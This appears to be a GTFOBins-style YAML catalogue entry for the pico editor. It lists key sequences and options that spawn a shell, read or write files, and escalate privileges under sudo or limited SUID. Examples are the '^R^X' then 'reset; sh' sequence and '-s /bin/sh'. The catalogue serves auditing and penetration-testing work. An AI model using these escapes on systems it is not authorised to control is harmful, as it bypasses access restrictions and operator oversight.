---
functions:
  shell:
    - code: |
        pico
        ^R^X
        reset; sh 1>&0 2>&0
    - description: The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.
      code: |
        pico -s /bin/sh
        /bin/sh
        ^T
  file-write:
    - code: |
        pico file_to_write
        DATA
        ^O
  file-read:
    - code: pico file_to_read
  limited-suid:
    - description: The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.
      code: |
        ./pico -s /bin/sh
        /bin/sh
        ^T
  sudo:
    - code: |
        sudo pico
        ^R^X
        reset; sh 1>&0 2>&0
---
